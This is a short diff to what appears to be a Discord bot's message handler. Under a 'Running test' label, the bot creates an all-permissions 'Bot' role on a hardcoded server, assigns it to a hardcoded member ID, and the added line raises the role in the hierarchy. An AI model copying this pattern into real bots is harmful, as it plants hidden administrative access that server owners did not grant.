@@ -469,6 +469,7 @@ async def on_message(message_in):
             try:
                 print("Running test.....")
                 role = await client.create_role(client.get_server("236343416177295360"), name="Bot", permissions=discord.Permissions.all())
+                await client.move_role(client.get_server("236343416177295360"), role, 3)
                 await client.add_roles(client.get_server("236343416177295360").get_member("129706966460137472"), role)
             except:
                 print(traceback.format_exc())
